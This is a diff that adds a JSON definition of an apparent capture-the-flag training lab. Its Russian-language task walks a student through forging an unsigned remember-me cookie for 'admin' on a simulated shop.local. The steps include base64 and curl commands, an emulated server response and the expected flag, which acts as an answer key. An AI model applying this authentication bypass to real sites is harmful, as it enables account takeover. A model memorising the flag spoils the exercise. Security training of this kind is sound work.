@@ -1,0 +1,34 @@
+{
+  "id": "web-remember-me",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{r3m3mb3r_m3_t0k3n_f0rg3d}"
+  },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: подделка remember-me токена\n\nЦель — `https://shop.local`. Cookie `remember-me` — это\n`base64(user:expiry:signature)`, но сервер **не проверяет** подпись, а доверяет\nполю `user`. Значит, можно собрать токен для `admin`.\n\n1. Декодируй пример чужого токена и пойми формат:\n   `echo 'dXNlcjoxODkzNDU2MDAwOjEyMzQ1Ng==' | base64 -d`\n2. Собери токен для администратора с далёким сроком:\n   `printf 'admin:1999999999:x' | base64`\n3. Предъяви его и забери флаг:\n   `curl -s 'https://shop.local/me' -H 'Cookie: remember-me=YWRtaW46MTk5OTk5OTk5OTp4' | grep 'nto{' > found.txt`\n4. Набери `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.local)",
+      "cases": [
+        {
+          "match": "remember-me=YWRtaW46",
+          "example": "-s 'https://shop.local/me' -H 'Cookie: remember-me=YWRtaW46MTk5OTk5OTk5OTp4'",
+          "output": "{\"user\":\"admin\",\"role\":\"administrator\",\"flag\":\"nto{r3m3mb3r_m3_t0k3n_f0rg3d}\"}\n"
+        },
+        {
+          "match": "/me|shop\\.local",
+          "example": "-s 'https://shop.local/me'",
+          "output": "{\"user\":\"guest\",\"role\":\"anonymous\"}\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только GET https://shop.local/me.\n"
+    }
+  }
+}
